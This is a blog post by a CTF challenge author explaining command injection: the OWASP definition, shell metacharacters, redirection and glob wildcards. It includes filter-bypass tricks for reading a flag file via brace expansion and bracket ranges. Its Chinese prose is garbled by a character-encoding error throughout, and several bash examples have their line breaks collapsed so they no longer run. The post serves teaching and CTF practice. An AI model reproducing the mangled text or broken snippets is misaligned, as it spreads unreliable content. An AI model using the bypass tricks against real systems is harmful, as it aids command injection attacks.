---
title: å·§ç”¨å‘½ä»¤æ³¨å…¥çš„Nç§æ–¹å¼
authorId: Zedd
tags:
  - RCE
categories:
  - Web å®‰å…¨
date: 2019-01-17 18:55:27
---

> â€‹	æœ¬æ–‡é¦–å‘äºè¡¥å¤©å¹³å°ï¼Œåœ°å€ï¼šhttps://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw

åœ¨`NUAACTF_2018`ä¸­ï¼Œæˆ‘å‡ºäº†ä¸€é“æ¯”è¾ƒæ°´çš„é‡‡ç”¨`Spring`æ¡†æ¶çš„`SSRF`+`Java Deserialization`+`Command Injection`ã€‚ä¸ªäººè§‰å¾—åœ¨å‡ºé¢˜æ—¶å€™ä¹Ÿå­¦ä¹ åˆ°äº†ä¸å°‘çŸ¥è¯†ï¼Œç‰¹åˆ«æ˜¯åœ¨`Command Injection`è¿™ä¸€å—è®©æˆ‘å¯¹`Command Injection`æœ‰äº†æ–°çš„çœ‹æ³•ã€‚

<!-- more -->

[TOC]

##	å‘½ä»¤æ³¨å…¥

###	ç†è®ºåŸºç¡€

> Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.
>
> This attack differs from [Code Injection](https://www.owasp.org/index.php/Code_Injection), in that code injection allows the attacker to add his own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code.

ä»¥ä¸Šæ¥è‡ª[Command Injection - OWASP](https://www.owasp.org/index.php/Command_Injection)ï¼Œç¿»è¯‘è¿‡æ¥å°±æ˜¯é€šè¿‡æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºåœ¨ä¸»æœºæ“ä½œç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å½“åº”ç”¨ç¨‹åºå°†ä¸å®‰å…¨çš„ç”¨æˆ·æä¾›çš„æ•°æ®ï¼ˆè¡¨å•ï¼Œcookieï¼ŒHTTPæ ‡å¤´ç­‰ï¼‰ä¼ é€’ç»™ç³»ç»Ÿshellæ—¶ï¼Œå¯èƒ½ä¼šå‘ç”Ÿå‘½ä»¤æ³¨å…¥æ”»å‡»ã€‚ åœ¨æ­¤æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…æä¾›çš„æ“ä½œç³»ç»Ÿå‘½ä»¤é€šå¸¸ä»¥æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºçš„æƒé™æ‰§è¡Œã€‚ å‘½ä»¤æ³¨å…¥æ”»å‡»å¾ˆå¯èƒ½ä¸»è¦æ˜¯ç”±äºè¾“å…¥éªŒè¯ä¸è¶³ã€‚æ­¤æ”»å‡»ä¸ä»£ç æ³¨å…¥ä¸åŒï¼Œå› ä¸ºä»£ç æ³¨å…¥å…è®¸æ”»å‡»è€…æ·»åŠ è‡ªå·±çš„ä»£ç ï¼Œç„¶åç”±åº”ç”¨ç¨‹åºæ‰§è¡Œã€‚ åœ¨å‘½ä»¤æ³¨å…¥ä¸­ï¼Œæ”»å‡»è€…æ‰©å±•äº†æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„åº”ç”¨ç¨‹åºçš„é»˜è®¤åŠŸèƒ½ï¼Œè€Œæ— éœ€æ³¨å…¥ä»£ç ã€‚

> â€‹	å‘½ä»¤æ³¨å…¥æ”»å‡»æœ€åˆè¢«ç§°ä¸ºShellå‘½ä»¤æ³¨å…¥æ”»å‡»ï¼Œæ˜¯ç”±æŒªå¨ä¸€åç¨‹åºå‘˜åœ¨1997å¹´æ„å¤–å‘ç°çš„ã€‚ç¬¬ä¸€ä¸ªå‘½ä»¤æ³¨å…¥æ”»å‡»ç¨‹åºèƒ½éšæ„åœ°ä»ä¸€ä¸ªç½‘ç«™åˆ é™¤ç½‘é¡µï¼Œå°±åƒä»ç£ç›˜æˆ–è€…ç¡¬ç›˜ç§»é™¤æ–‡ä»¶ä¸€æ ·ç®€å•ã€‚		â€”â€”ç™¾åº¦ç™¾ç§‘

###	ç‰¹æ®Šç¬¦å·

è®²åˆ°å‘½ä»¤æ³¨å…¥ï¼Œå°±ä¸å¾—ä¸æåˆ°ç‰¹æ®Šç¬¦å·çš„è¿ç”¨ã€‚ä¾‹å¦‚ä¸Šé¢ä¾‹å­ä¸­çš„`|`ç®¡é“ç¬¦ï¼Œè¿˜æœ‰æ¯”è¾ƒå¤šçš„ç±»ä¼¼æœ‰å¥‡æ•ˆçš„ç¬¦å·ç»„åˆã€‚

####	|

è¿ç»“ä¸Šä¸ªæŒ‡ä»¤çš„æ ‡å‡†è¾“å‡ºï¼Œåšä¸ºä¸‹ä¸ªæŒ‡ä»¤çš„æ ‡å‡†è¾“å…¥ã€‚

####	&

ç”¨æˆ·æœ‰æ—¶å€™æ‰§è¡Œå‘½ä»¤è¦èŠ±å¾ˆé•¿æ—¶é—´ï¼Œå¯èƒ½ä¼šå½±å“åšå…¶ä»–äº‹æƒ…ã€‚æœ€å¥½çš„æ–¹æ³•æ˜¯å°†å®ƒæ”¾åœ¨åå°æ‰§è¡Œã€‚åå°è¿è¡Œçš„ç¨‹åºåœ¨ç”¨æˆ·æ³¨é”€åç³»ç»Ÿè¿˜å¯ä»¥ç»§ç»­æ‰§è¡Œã€‚å½“è¦æŠŠå‘½ä»¤æ”¾åœ¨åå°æ‰§è¡Œæ—¶ï¼Œåœ¨å‘½ä»¤çš„åé¢åŠ ä¸Š`&`ã€‚

####	Linuxä¸­çš„&&ä¸||

`shell`åœ¨æ‰§è¡ŒæŸä¸ªå‘½ä»¤çš„æ—¶å€™ï¼Œä¼šè¿”å›ä¸€ä¸ªè¿”å›å€¼ï¼Œè¯¥è¿”å›å€¼ä¿å­˜åœ¨`shell`å˜é‡ `$?` ä¸­ã€‚å½“ `$? == 0` æ—¶ï¼Œè¡¨ç¤ºæ‰§è¡ŒæˆåŠŸï¼›å½“ `$? == 1` æ—¶ï¼Œè¡¨ç¤ºæ‰§è¡Œå¤±è´¥ã€‚æœ‰æ—¶å€™ï¼Œä¸‹ä¸€æ¡å‘½ä»¤ä¾èµ–å‰ä¸€æ¡å‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚å¦‚ï¼šåœ¨æˆåŠŸåœ°æ‰§è¡Œä¸€æ¡å‘½ä»¤ä¹‹åå†æ‰§è¡Œå¦ä¸€æ¡å‘½ä»¤ï¼Œæˆ–è€…åœ¨ä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥åå†æ‰§è¡Œå¦ä¸€æ¡å‘½ä»¤ç­‰ã€‚`shell`æä¾›äº†`&&`å’Œ`||`æ¥å®ç°å‘½ä»¤æ‰§è¡Œæ§åˆ¶çš„åŠŸèƒ½ï¼Œ`shell`å°†æ ¹æ®`&&`æˆ–`||`å‰é¢å‘½ä»¤çš„è¿”å›å€¼æ¥æ§åˆ¶å…¶åé¢å‘½ä»¤çš„æ‰§è¡Œã€‚  

####	&&

è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š

    command1 && command2 [&& command3 ...]  

* å‘½ä»¤ä¹‹é—´ä½¿ç”¨ && è¿æ¥ï¼Œå®ç°é€»è¾‘ä¸çš„åŠŸèƒ½ã€‚  

* åªæœ‰åœ¨`&&`å·¦è¾¹çš„å‘½ä»¤è¿”å›çœŸï¼ˆå‘½ä»¤è¿”å›å€¼ `$? == 0`ï¼‰ï¼Œ`&&`å³è¾¹çš„å‘½ä»¤æ‰ä¼šè¢«æ‰§è¡Œ

* åªè¦æœ‰ä¸€ä¸ªå‘½ä»¤è¿”å›å‡ï¼ˆå‘½ä»¤è¿”å›å€¼ `$? == 1`ï¼‰ï¼Œåé¢çš„å‘½ä»¤å°±ä¸ä¼šè¢«æ‰§è¡Œ


```bash
$ cp ~/Desktop/1.txt ~/1.txt && rm ~/Desktop/1.txt && echo "success"  
```

ç¤ºä¾‹ ä¸­çš„å‘½ä»¤é¦–å…ˆä»`~/Desktop`ç›®å½•å¤åˆ¶ `1.txt`æ–‡ä»¶åˆ°`~`ç›®å½•ï¼›æ‰§è¡ŒæˆåŠŸåï¼Œä½¿ç”¨`rm`åˆ é™¤æºæ–‡ä»¶ï¼›å¦‚æœåˆ é™¤æˆåŠŸåˆ™è¾“å‡ºæç¤ºä¿¡æ¯ã€‚

####	||

è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š  

    command1 || command2 [|| command3 ...]  

* å‘½ä»¤ä¹‹é—´ä½¿ç”¨ || è¿æ¥ï¼Œå®ç°é€»è¾‘æˆ–çš„åŠŸèƒ½ã€‚

* åªæœ‰åœ¨ || å·¦è¾¹çš„å‘½ä»¤è¿”å›å‡ï¼ˆå‘½ä»¤è¿”å›å€¼ `$? == 1`ï¼‰ï¼Œ`||`å³è¾¹çš„å‘½ä»¤æ‰ä¼šè¢«æ‰§è¡Œã€‚è¿™å’Œ`c`è¯­è¨€ä¸­çš„é€»è¾‘æˆ–è¯­æ³•åŠŸèƒ½ç›¸åŒï¼Œå³å®ç°çŸ­è·¯é€»è¾‘æˆ–æ“ä½œã€‚

* åªè¦æœ‰ä¸€ä¸ªå‘½ä»¤è¿”å›çœŸï¼ˆå‘½ä»¤è¿”å›å€¼ `$? == 0`ï¼‰ï¼Œåé¢çš„å‘½ä»¤å°±ä¸ä¼šè¢«æ‰§è¡Œã€‚  


```bash
$ rm ~/Desktop/1.txt || echo "fail"  
```

å¦‚æœ ~/Desktop ç›®å½•ä¸‹ä¸å­˜åœ¨æ–‡ä»¶ 1.txtï¼Œå°†è¾“å‡ºæç¤ºä¿¡æ¯ã€‚  



####	;åˆ†å·

å½“æœ‰å‡ ä¸ªå‘½ä»¤è¦è¿ç»­æ‰§è¡Œæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒä»¬æ”¾åœ¨ä¸€è¡Œå†…ï¼Œä¸­é—´ç”¨`;`åˆ†å¼€ã€‚

####	`åå¼•å·ï¼ˆé‡éŸ³ç¬¦ï¼‰

å‘½ä»¤æ›¿ä»£ï¼Œå¤§éƒ¨åˆ†`Unix shell`ä»¥åŠç¼–ç¨‹è¯­è¨€å¦‚`Perl`ã€`PHP`ä»¥åŠ`Ruby`ç­‰éƒ½ä»¥æˆå¯¹çš„é‡éŸ³ç¬¦(åå¼•å·)ä½œæŒ‡ä»¤æ›¿ä»£ï¼Œæ„æ€æ˜¯ä»¥æŸä¸€ä¸ªæŒ‡ä»¤çš„è¾“å‡ºç»“æœä½œä¸ºå¦ä¸€ä¸ªæŒ‡ä»¤çš„è¾“å…¥é¡¹ã€‚ä¾‹å¦‚ä»¥ä¸‹æŒ‡ä»¤:

```bash
echo It is now `date` 

ç­‰ä»·äºï¼š
echo It is now ä¸€ 12æœˆ 17 12:16:04 GMT 2018

åœ¨æ­£å¼æ‰§è¡Œæ—¶ä¼šäº§ç”Ÿä»¥ä¸‹è¾“å‡ºç»“æœï¼š
It is now ä¸€ 12æœˆ 17 12:16:04 GMT 2018
```

####	'å•å¼•å·

è¢«å•å¼•å·æ‹¬ä½çš„å†…å®¹,å°†è¢«è§†ä¸ºå•ä¸€å­—ç¬¦ä¸²ã€‚åœ¨å¼•å·å†…çš„å˜é‡`$`ç¬¦å·å°†ä¼šå¤±æ•ˆï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå°†è¢«è§†ä½œä¸€èˆ¬ç¬¦å·å¤„ç†ã€‚

####	"åŒå¼•å·

è¢«åŒå¼•å·æ‹¬ä½çš„å†…å®¹ï¼Œå°†è¢«è§†ä¸ºå•ä¸€å­—ç¬¦ä¸²ï¼Œé˜²æ­¢é€šé…ç¬¦çš„æ‰©å±•ï¼Œä½†å…è®¸å˜é‡æ‰©å±• ï¼Œè¿™ç‚¹ä¸å•å¼•å·çš„å¤„ç†æ–¹å¼ä¸åŒ

####	()æŒ‡ä»¤ç¾¤ç»„

æ ¼å¼ä¸ºï¼š(command1;command2[;command3...])

* ä¸€æ¡å‘½ä»¤éœ€è¦ç‹¬å ä¸€ä¸ªç‰©ç†è¡Œï¼Œå¦‚æœéœ€è¦å°†å¤šæ¡å‘½ä»¤æ”¾åœ¨åŒä¸€è¡Œï¼Œå‘½ä»¤ä¹‹é—´ä½¿ç”¨å‘½ä»¤åˆ†éš”ç¬¦ï¼ˆ;ï¼‰åˆ†éš”ã€‚æ‰§è¡Œçš„æ•ˆæœç­‰åŒäºå¤šä¸ªç‹¬ç«‹çš„å‘½ä»¤å•ç‹¬æ‰§è¡Œçš„æ•ˆæœã€‚
* è¡¨ç¤ºåœ¨å½“å‰ shell ä¸­å°†å¤šä¸ªå‘½ä»¤ä½œä¸ºä¸€ä¸ªæ•´ä½“æ‰§è¡Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨ () æ‹¬èµ·æ¥çš„å‘½ä»¤åœ¨æ‰§è¡Œå‰é¢éƒ½ä¸ä¼šåˆ‡æ¢å½“å‰å·¥ä½œç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´å‘½ä»¤ç»„åˆéƒ½æ˜¯åœ¨å½“å‰å·¥ä½œç›®å½•ä¸‹è¢«æ‰§è¡Œçš„ï¼Œå°½ç®¡å‘½ä»¤ä¸­æœ‰åˆ‡æ¢ç›®å½•çš„å‘½ä»¤ã€‚
* å‘½ä»¤ç»„åˆå¸¸å’Œå‘½ä»¤æ‰§è¡Œæ§åˆ¶ç»“åˆèµ·æ¥ä½¿ç”¨ã€‚  

ç”¨æ‹¬å·å°†ä¸€ä¸²è¿ç»­æŒ‡ä»¤æ‹¬èµ·æ¥ï¼Œè¿™ç§ç”¨æ³•å¯¹`shell`æ¥è¯´ï¼Œç§°ä¸ºæŒ‡ä»¤ç¾¤ç»„ã€‚å¦‚ä¸‹é¢çš„ä¾‹å­:

```bash
(cd ~ ; vcgh=`pwd` ;echo $vcgh)
```

æŒ‡ä»¤ç¾¤ç»„æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œshellä¼šä»¥äº§ç”Ÿ`subshell`æ¥æ‰§è¡Œè¿™ç»„æŒ‡ä»¤ã€‚

```bash
$ rm ~/Desktop/1.txt || (cd ~/Desktop/;ls -a;echo "fail")  

å¦‚æœç›®å½• ~/Desktop ä¸‹ä¸å­˜åœ¨æ–‡ä»¶ 1.txtï¼Œåˆ™æ‰§è¡Œå‘½ä»¤ç»„åˆã€‚ 
```



####	(())

è¿™ç»„ç¬¦å·çš„ä½œç”¨ä¸ let æŒ‡ä»¤ç›¸ä¼¼ï¼Œç”¨åœ¨ç®—æ•°è¿ç®—ä¸Šï¼Œæ˜¯ bash çš„å†…å»ºåŠŸèƒ½ã€‚æ‰€ä»¥ï¼Œåœ¨æ‰§è¡Œæ•ˆç‡ä¸Šä¼šæ¯”ä½¿ç”¨ letæŒ‡ä»¤è¦å¥½è®¸å¤šã€‚

```bash
#!/bin/bash(( a = 10 ))echo -e "inital value, a = $a\n"(( a++))echo "after a++, a = $a"
```



####	{}å¤§æ‹¬å·

å…¶å®å¤§æ‹¬å·æœ‰ä¸€ç§æ‹¼æ¥å­—ç¬¦ä¸²çš„ç”¨æ³•ï¼Œ`{xx,yy,zz,...}`è¿™ç§å¤§æ‹¬å·çš„ç»„åˆï¼Œå¸¸ç”¨åœ¨å­—ä¸²çš„ç»„åˆä¸Šï¼Œæ¥çœ‹ä¸ªä¾‹å­

```bash
mkdir {userA,userB,userC}-{home,bin,data}
```

æˆ‘ä»¬å¾—åˆ°`userA-home, userA-bin, userA-data, userB-home, userB-bin,userB-data, userC-home, userC-bin,userC-data`ã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥æœ‰

```Â bash
$ cat {/fl,/fla}{ag,g}
flag{xxx}
cat: /flg: No such file or directory
cat: /flaag: No such file or directory
flag{xxx}
```



####	[]ä¸­æ‹¬å·

å¸¸å‡ºç°åœ¨æµç¨‹æ§åˆ¶ä¸­ï¼Œæ‰®æ¼”æ‹¬ä½åˆ¤æ–­å¼çš„ä½œç”¨ã€‚`if [ "$?" != 0 ]thenecho "Executes error"exit1fi`ã€‚è¿™ä¸ªç¬¦å·åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æ‹…ä»»ç±»ä¼¼ "èŒƒå›´" æˆ– "é›†åˆ" çš„è§’è‰²ã€‚

```bash
$ cat /fl[0-z]g
flag{xxx}
```



####	[[ ]]

è¿™ç»„ç¬¦å·ä¸å…ˆå‰çš„` []` ç¬¦å·ï¼ŒåŸºæœ¬ä¸Šä½œç”¨ç›¸åŒï¼Œä½†å¥¹å…è®¸åœ¨å…¶ä¸­ç›´æ¥ä½¿ç”¨`||`ä¸`&&`é€»è¾‘ç­‰ç¬¦å·ã€‚

```bash
#!/bin/bashread akif [[ $ak > 5 || $ak< 9 ]]thenecho $akfi
```



####	å°æ‹¬å·ï¼Œä¸­æ‹¬å·ï¼Œå’Œå¤§æ‹¬å·çš„åŒºåˆ«

é‚£ä¹ˆï¼Œä¸‹é¢åˆæ¶‰åŠåˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å°æ‹¬å·ï¼Œä¸­æ‹¬å·ï¼Œå’Œå¤§æ‹¬å·çš„åŒºåˆ«ã€‚

1. å•å°æ‹¬å·ï¼Œ(cmd1;cmd2;cmd3) æ–°å¼€ä¸€ä¸ªå­shellé¡ºåºæ‰§è¡Œå‘½ä»¤cmd1,cmd2,cmd3, å„å‘½ä»¤ä¹‹é—´ç”¨åˆ†å·éš”å¼€, æœ€åä¸€ä¸ªå‘½ä»¤åå¯ä»¥æ²¡æœ‰åˆ†å·ã€‚æŠŠ`command group`æ”¾åœ¨`subshell`å»æ‰§è¡Œï¼Œä¹Ÿå«åš`nested sub-shell`ã€‚
2. å•å¤§æ‹¬å·ï¼Œ{ cmd1;cmd2;cmd3;} åœ¨å½“å‰shellé¡ºåºæ‰§è¡Œå‘½ä»¤cmd1,cmd2,cmd3, å„å‘½ä»¤ä¹‹é—´ç”¨åˆ†å·éš”å¼€, æœ€åä¸€ä¸ªå‘½ä»¤åå¿…é¡»æœ‰åˆ†å·, ç¬¬ä¸€æ¡å‘½ä»¤å’Œå·¦æ‹¬å·ä¹‹é—´å¿…é¡»ç”¨ç©ºæ ¼éš”å¼€ã€‚èŠ±æ‹¬å·æ˜¯åœ¨åŒä¸€ä¸ª shell å…§å®Œæˆï¼Œä¹Ÿç§°ä¸º `non-namedcommand group`ã€‚

æ‰€ä»¥è¯´ï¼Œå¦‚æœåœ¨shellé‡Œé¢æ‰§è¡Œâ€œå‡½æ•°â€ï¼Œéœ€è¦ç”¨åˆ°{}ï¼Œå®é™…ä¸Šä¹Ÿå°±æ˜¯ä¸€ä¸ªå‘½ä»¤ç¾¤ç»„ä¹ˆã€‚
ä¸è¿‡ï¼Œæ ¹æ®å®æµ‹ï¼Œ`test=$(ls -a)`å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯`test=${lsâ€“a}`è¯­æ³•ä¸Šé¢æ˜¯æœ‰é”™è¯¯çš„ã€‚ä¼°è®¡ä¹Ÿå’Œä¸Šé¢æ‰€è¯´çš„åŸå› æœ‰å…³ã€‚

å¦å¤–ï¼Œä»ç½‘ä¸Šæ‘˜å½•çš„åŒºåˆ«å¦‚ä¸‹ï¼š

* ()åªæ˜¯å¯¹ä¸€ä¸²å‘½ä»¤é‡æ–°å¼€ä¸€ä¸ªå­shellè¿›è¡Œæ‰§è¡Œ

* {}å¯¹ä¸€ä¸²å‘½ä»¤åœ¨å½“å‰shellæ‰§è¡Œ

* ()å’Œ{}éƒ½æ˜¯æŠŠä¸€ä¸²çš„å‘½ä»¤æ”¾åœ¨æ‹¬å·é‡Œé¢ï¼Œå¹¶ä¸”å‘½ä»¤ä¹‹é—´ç”¨;å·éš”å¼€

* ()æœ€åä¸€ä¸ªå‘½ä»¤å¯ä»¥ä¸ç”¨åˆ†å·

* {}æœ€åä¸€ä¸ªå‘½ä»¤è¦ç”¨åˆ†å·

* {}çš„ç¬¬ä¸€ä¸ªå‘½ä»¤å’Œå·¦æ‹¬å·ä¹‹é—´å¿…é¡»è¦æœ‰ä¸€ä¸ªç©ºæ ¼

* ()é‡Œçš„å„å‘½ä»¤ä¸å¿…å’Œæ‹¬å·æœ‰ç©ºæ ¼

* ()å’Œ{}ä¸­æ‹¬å·é‡Œé¢çš„æŸä¸ªå‘½ä»¤çš„é‡å®šå‘åªå½±å“è¯¥å‘½ä»¤ï¼Œä½†æ‹¬å·å¤–çš„é‡å®šå‘åˆ™å½±å“åˆ°æ‹¬å·é‡Œçš„æ‰€æœ‰å‘½ä»¤


è¿™é‡Œå¼•å‡ºæ¥`[..]`å’Œ`[[...]]`çš„åŒºåˆ«ï¼šä½¿ç”¨`[[...]]`æ¡ä»¶åˆ¤æ–­ç»“æ„, è€Œä¸æ˜¯`[...]`, èƒ½å¤Ÿé˜²æ­¢è„šæœ¬ä¸­çš„è®¸å¤šé€»è¾‘é”™è¯¯.æ¯”å¦‚`&&`,` ||`,`<`,å’Œ`>` æ“ä½œç¬¦èƒ½å¤Ÿæ­£å¸¸å­˜åœ¨äº`[[ ]]`æ¡ä»¶åˆ¤æ–­ç»“æ„ä¸­, ä½†æ˜¯å¦‚æœå‡ºç°åœ¨`[]`ç»“æ„ä¸­çš„è¯ï¼Œä¼šæŠ¥é”™ã€‚

å¯¹`{}`å’Œ`()`è€Œè¨€, æ‹¬å·ä¸­çš„é‡å®šå‘ç¬¦åªå½±å“è¯¥æ¡å‘½ä»¤ï¼Œ è€Œæ‹¬å·å¤–çš„é‡å®šå‘ç¬¦å½±å“åˆ°æ‹¬å·ä¸­çš„æ‰€æœ‰å‘½ä»¤ã€‚



####	è¾“å…¥è¾“å‡º/é‡å®šå‘

```
>      >>   <   <<   :>   &>   2&>   2<>>&   >&2
```

æ–‡ä»¶æè¿°ç¬¦(File Descriptor)ï¼Œç”¨ä¸€ä¸ªæ•°å­—ï¼ˆé€šå¸¸ä¸º0-9ï¼‰æ¥è¡¨ç¤ºä¸€ä¸ªæ–‡ä»¶ã€‚

| æ–‡ä»¶æè¿°ç¬¦ | åç§°         | å¸¸ç”¨ç¼©å†™ | é»˜è®¤å€¼ |
| ---------- | ------------ | -------- | ------ |
| 0          | æ ‡å‡†è¾“å…¥     | stdin    | é”®ç›˜   |
| 1          | æ ‡å‡†è¾“å‡º     | stdout   | å±å¹•   |
| 2          | æ ‡å‡†é”™è¯¯è¾“å‡º | stderr   | å±å¹•   |

æˆ‘ä»¬åœ¨ç®€å•åœ°ç”¨`<`æˆ–`>`æ—¶ï¼Œç›¸å½“äºä½¿ç”¨`0<`æˆ–`1>`ï¼ˆä¸‹é¢ä¼šè¯¦ç»†ä»‹ç»ï¼‰ã€‚

* cmd > file
  æŠŠcmdå‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶fileä¸­ã€‚å¦‚æœfileå·²ç»å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºåŸæœ‰æ–‡ä»¶ï¼Œä½¿ç”¨bashçš„noclobberé€‰é¡¹å¯ä»¥é˜²æ­¢å¤ç›–åŸæœ‰æ–‡ä»¶ã€‚

* cmd >> file
  æŠŠcmdå‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶fileä¸­ï¼Œå¦‚æœfileå·²ç»å­˜åœ¨ï¼Œåˆ™æŠŠä¿¡æ¯åŠ åœ¨åŸæœ‰æ–‡ä»¶åé¢ã€‚

* cmd < file
  ä½¿cmdå‘½ä»¤ä»fileè¯»å…¥

* cmd << text
  ä»å‘½ä»¤è¡Œè¯»å–è¾“å…¥ï¼Œç›´åˆ°ä¸€ä¸ªä¸textç›¸åŒçš„è¡Œç»“æŸã€‚é™¤éä½¿ç”¨å¼•å·æŠŠè¾“å…¥æ‹¬èµ·æ¥ï¼Œæ­¤æ¨¡å¼å°†å¯¹è¾“å…¥å†…å®¹è¿›è¡Œshellå˜é‡æ›¿æ¢ã€‚å¦‚æœä½¿ç”¨`<<-` ï¼Œåˆ™ä¼šå¿½ç•¥æ¥ä¸‹æ¥è¾“å…¥è¡Œé¦–çš„tabï¼Œç»“æŸè¡Œä¹Ÿå¯ä»¥æ˜¯ä¸€å †tabå†åŠ ä¸Šä¸€ä¸ªä¸textç›¸åŒçš„å†…å®¹ï¼Œå¯ä»¥å‚è€ƒå¾Œé¢çš„ä¾‹å­ã€‚

* cmd <<< word
  æŠŠwordï¼ˆè€Œä¸æ˜¯æ–‡ä»¶wordï¼‰å’Œåé¢çš„æ¢è¡Œä½œä¸ºè¾“å…¥æä¾›ç»™cmdã€‚

* cmd <> file
  ä»¥è¯»å†™æ¨¡å¼æŠŠæ–‡ä»¶fileé‡å®šå‘åˆ°è¾“å…¥ï¼Œæ–‡ä»¶fileä¸ä¼šè¢«ç ´åã€‚ä»…å½“åº”ç”¨ç¨‹åºåˆ©ç”¨äº†è¿™ä¸€ç‰¹æ€§æ—¶ï¼Œå®ƒæ‰æ˜¯æœ‰æ„ä¹‰çš„ã€‚

* cmd >| file
  åŠŸèƒ½åŒ>ï¼Œä½†å³ä¾¿åœ¨è®¾ç½®äº†noclobberæ—¶ä¹Ÿä¼šå¤ç›–fileæ–‡ä»¶ï¼Œæ³¨æ„ç”¨çš„æ˜¯|è€Œéä¸€äº›ä¹¦ä¸­è¯´çš„!ï¼Œç›®å‰ä»…åœ¨cshä¸­ä»æ²¿ç”¨`>!`å®ç°è¿™ä¸€åŠŸèƒ½ã€‚

* : > filename

  æŠŠæ–‡ä»¶`filename`æˆªæ–­ä¸º0é•¿åº¦ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨, é‚£ä¹ˆå°±åˆ›å»ºä¸€ä¸ª0é•¿åº¦çš„æ–‡ä»¶(ä¸`touch`çš„æ•ˆæœç›¸åŒ).

* cmd >&n 

  æŠŠè¾“å‡ºé€åˆ°æ–‡ä»¶æè¿°ç¬¦n

* cmd m>&n 

  æŠŠè¾“å‡ºåˆ°æ–‡ä»¶ç¬¦mçš„ä¿¡æ¯é‡å®šå‘åˆ°æ–‡ä»¶æè¿°ç¬¦n

* cmd >&- 

  å…³é—­æ ‡å‡†è¾“å‡º

* cmd <&n 

  è¾“å…¥æ¥è‡ªæ–‡ä»¶æè¿°ç¬¦n

* cmd m<&n

  mæ¥è‡ªæ–‡ä»¶æè¿°å„ä¸ªn

* cmd <&-

  å…³é—­æ ‡å‡†è¾“å…¥

* cmd <&n-

  ç§»åŠ¨è¾“å…¥æ–‡ä»¶æè¿°ç¬¦nè€Œéå¤åˆ¶å®ƒã€‚

* cmd >&n-

  ç§»åŠ¨è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦nè€Œéå¤åˆ¶å®ƒã€‚
  æ³¨æ„ï¼š `>&`å®é™…ä¸Šå¤åˆ¶äº†æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™ä½¿å¾—`cmd > file 2>&1`ä¸`cmd 2>&1 >file`çš„æ•ˆæœä¸ä¸€æ ·ã€‚



###	é€šé…ç¬¦

è¿˜æœ‰ä¸€ç±»é€šé…ç¬¦ï¼Œé¦–å…ˆå…ˆäº†è§£ä¸‹ä»€ä¹ˆæ˜¯Linux shellé€šé…ç¬¦/globæ¨¡å¼:

> glob æ¨¡å¼ï¼ˆglobbingï¼‰ä¹Ÿè¢«ç§°ä¹‹ä¸º shell é€šé…ç¬¦ï¼Œåå­—çš„èµ·æºæ¥è‡ªäº Unix V6 ä¸­çš„ `/etc/glob` ï¼ˆè¯¦è§ man æ–‡æ¡£ï¼‰ã€‚glob æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ¨¡å¼åŒ¹é…ï¼Œæœ€å¸¸è§çš„æ˜¯é€šé…ç¬¦æ‹“å±•ï¼Œä¹Ÿå¯ä»¥å°† glob æ¨¡å¼è®¾ä¸ºç²¾ç®€äº†çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œåœ¨æœ€æ–°çš„ CentOS 7 ä¸­å·²ç»åˆ é™¤äº† glob çš„ç›¸å…³æè¿°æ–‡æ¡£ï¼Œåˆ é™¤çš„åŸå› ç”±äº glob å·²ç»æ•´åˆåˆ°äº† shell ä¹‹ä¸­ï¼Œç„¶åå°±æœ‰äº† shell é€šé…ç¬¦ã€‚**shell é€šé…ç¬¦ / glob æ¨¡å¼é€šå¸¸ç”¨æ¥åŒ¹é…ç›®å½•ä»¥åŠæ–‡ä»¶ï¼Œè€Œä¸æ˜¯æ–‡æœ¬ï¼ï¼ï¼**

####	è¯­æ³•

| å­—ç¬¦            | è§£é‡Š                                                         |
| --------------- | ------------------------------------------------------------ |
| *               | åŒ¹é…ä»»æ„é•¿åº¦ä»»æ„å­—ç¬¦                                         |
| ?               | åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦                                             |
| [list]          | åŒ¹é…æŒ‡å®šèŒƒå›´å†…ï¼ˆlistï¼‰ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ç»„æˆçš„é›†åˆ |
| [^list]         | åŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦é›†åˆ                       |
| [!list]         | åŒ`[^list]`                                                  |
| {str1,str2,...} | åŒ¹é… srt1 æˆ–è€… srt2 æˆ–è€…æ›´å¤šå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯é›†åˆ             |
